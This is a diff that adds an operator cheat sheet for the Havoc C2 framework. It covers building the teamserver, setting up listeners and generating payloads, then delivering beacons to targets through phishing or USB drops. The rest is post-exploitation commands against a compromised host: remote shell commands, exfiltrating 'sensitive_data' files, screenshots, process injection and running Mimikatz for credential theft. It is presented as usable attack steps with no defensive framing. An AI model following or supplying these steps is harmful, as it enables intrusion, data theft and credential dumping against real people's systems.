@@ -1,0 +1,64 @@
+# ================= HavocC2 =================
+# Clone the Havoc repository
+git clone https://github.com/HavocFramework/Havoc.git
+cd Havoc
+
+# Run the setup script to install dependencies and build the project
+bash setup.sh
+
+# Start the Havoc server
+./teamserver
+
+# Start the Havoc client (GUI)
+./havoc
+
+# ---------------- LISTENER SETUP ----------------
+# In the GUI, create a new listener (e.g., HTTP/HTTPS)
+# Set the desired host, port, and listener type (HTTP, HTTPS, SMB, etc.)
+
+# ---------------- PAYLOAD GENERATION ----------------
+# Go to "Payloads" tab in GUI
+# Generate a new payload (EXE, DLL, shellcode, etc.)
+# Select the listener and architecture (x64/x86)
+
+# ---------------- BEACON DEPLOYMENT ----------------
+# Deliver the payload to the target via phishing, USB drop, etc.
+
+# ---------------- INTERACT WITH AGENT ----------------
+# Once the agent checks in, you’ll see it in the “Agents” tab
+
+# Open session interaction:
+interact <agent_id>
+
+# Run shell commands on the target
+shell whoami
+shell ipconfig
+
+# Upload a file
+upload /path/to/local/file.exe
+
+# Download a file
+download C:\sensitive_data.txt
+
+# Take a screenshot
+screenshot
+
+# List and kill processes
+ps
+kill <pid>
+
+# Inject into a remote process
+inject <pid> <shellcode_path>
+
+# Run Mimikatz from memory
+mimikatz
+
+# ---------------- NOTES ----------------
+# Havoc supports BOFs (Beacon Object Files) for advanced in-memory operations
+# You can integrate custom C2 profiles and encrypted communication channels
+
+# Exit session
+exit
+
+# Shut down server
+Ctrl+C (from terminal running teamserver)
